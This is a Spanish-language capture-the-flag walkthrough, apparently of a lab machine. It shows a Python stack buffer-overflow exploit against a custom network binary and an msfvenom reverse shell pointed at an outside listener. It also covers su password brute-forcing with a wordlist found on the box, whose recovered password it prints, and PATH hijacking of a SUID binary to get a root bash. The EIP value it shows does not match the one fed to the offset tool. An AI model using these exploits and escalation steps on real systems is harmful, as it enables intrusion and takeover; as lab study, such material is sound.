## Reconocimiento:

Puerto 80 : HTTP

Puerto 20201 : unknown 

En la web hay para descargar un binario llamado “secure_software”, que al ejecutarlo dice:

```bash
"listening at 0.0.0.0:20201"
```

Y en la web por el puerto 20201 solo dice en texto plano:

```bash
"Enter data:"
```

Parece que hay que conseguir una reverse shell aplicando ingeniería inversa. Pero antes voy revisar la seguridad del binario:

```bash
checksec --file=secure_software
# Info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   50 Symbols        No    0               1               secure_software
```

No tiene medidas básicas de seguridad.

 Usare pwndbg:

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Primero voy a generar el payload para probar un Buffer Overflow:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Para automatizar el proceso del ataque creamos u n script en python:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

test_pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + test_pattern + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Primero ejecuto el binario con gdb y luego el script.

Se confirma el Buffer Overflow con el mensaje “Segmentation Fault”. También detectamos la dirección de memoria EIP:

```bash
0x41306b41
```

Queremos sobrescribir ese espacio de memoria, toca identificar el Offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41366a41
# Info:
[*] Exact match at offset 288
```

Indicando así que el offset es de 288 bytes. Modifico el script:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
eip_override = b"B" * 4

crafted_payload = padding + eip_override

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Mismo proceso de ejecución y logro sobrescribir el espacio de memoria:

```python
EIP 0x42424242
```

Pero antes hay que verificar el espacio después del EIP, añadiendo una variable “after_eip” con el valor (CCCC). Edito el script:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
eip_override = b"B" * 4
post_eip_data = b"C" * 300

crafted_payload = padding + eip_override + post_eip_data

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

En GDB, verifica la pila (`stack`) para comprobar que los `CCCC` aparecen después del `EIP`. 

```bash
x/300wx $esp
# Info:
0xffffd330:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd340:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd350:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffd360:     0x43434343      0x43434343      0x43434343      0xffff0a0d
...
```

Aprovechando la vulnerabilidad toca generar la shellcode para luego inyectarla, primero verificamos el OpCode para JMP ESP.

Info técnica:

El código **JMP ESP** es un tipo de instrucción en ensamblador.

### ¿Qué significa JMP ESP?

- **JMP**: instrucción de salto (jump).
- **ESP**: registro de la pila en arquitecturas x86.

En pocas palabras, **JMP ESP** hace que la ejecución del programa salte a la dirección que apunta el registro ESP (la pila), donde normalmente se coloca código (*shellcode*).

Identificación:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm >
jmp esp
# Info:
00000000  FFE4              jmp esp
```

Ahora toca saber cual es la dirección de memoria que permite realizar el JMP ESP:

```bash
objdump -d secure_software | grep "FF E4" -i
# Info
0x08049213
```

Genero la shell:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f py
```

Y edito el script con toda la nueva info:

```python
#!/usr/bin/python3

import socket
from struct import pack

target_ip = "172.17.0.2"
target_port = 20201

buffer_size = 288
padding = b"A" * buffer_size
jmp_esp_address = pack("<L", 0x08049213)  # Dirección de JMP ESP obtenida con análisis previo.
nop_sled = b'\x90' * 32  # Pista de NOPs para mayor tolerancia.

# Shellcode personalizado para reverse shell
<CONTENT_GENERATE>

crafted_payload = padding + jmp_esp_address + nop_sled + buf

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(b"Data Input: " + crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Info sobre el script:

**Desbordamiento del buffer**: El payload comienza con `A`'s para llenar el buffer hasta alcanzar el `offset` donde se sobrescribe el `EIP` (`288` en este caso).

**Dirección de retorno**: Utilizamos la dirección de una instrucción `jmp esp` para redirigir la ejecución hacia nuestro `shellcode`. Esta dirección se obtiene mediante análisis del binario vulnerable usando herramientas como `gdb`.

**NOP sled**: Se añade una "`pista`" de `NOPs` (`\x90`) antes del `shellcode` para garantizar que cualquier variación en la dirección de salto no interfiera con la ejecución del `payload`.

Nos ponemos a la escucha:

```python
nc -lvnp 4444
```

Ejecutamos el binario en gdb y luego el script.

## Escalada securedev → johntheripper

```python
find / -type f -type f -user johntheripper 2>/dev/null
# Info:
/opt/.hidden/words
```

Info:

```python
I love these words:

test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
!!10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
```

Parecen posibles contraseñas, las pongo en un archivo txt. 

Haré un ataque de fuerza bruta desde dentro del servidor:

https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh

```python
bash suBruteforce.sh johntheripper dic.txt
# Info:
[+] Contraseña encontrada para el usuario johntheripper:tset0tevst!
```

## Estacada johntheripper → root

```python
find / -type f -perm -4000 -ls 2>/dev/null
```

Se ve que /home/johntheripper/.show_files tiene permisos SUID.

Parece un ejecutable, así que lo analizo desde mi maquina host:

```python
# Victima:
python3 -m http.server

# Host:
wget http://172.17.0.2:8000/show_files
```

Usaré Ghidra para ver sus funciones:

```bash
ghidra
```

Dentro de la variable “main” se ve que esta ejecutando el comando “ls” de forma insegura. En este caso pruebo realizar una técnica llamada “Path Hijacking”. Me voy a crear un archivo malicioso llamado “ls” con una bash privilegiada para aprovechar el SUID:

```bash
nano ls
# Dentro:
#!/bin/bash 
/usr/bin/bash -p
```

Luego modifico el PATH:

```bash
export PATH=/home/johntheripper:$PATH
chmod +x ./ls
./show_files
```

Listo.
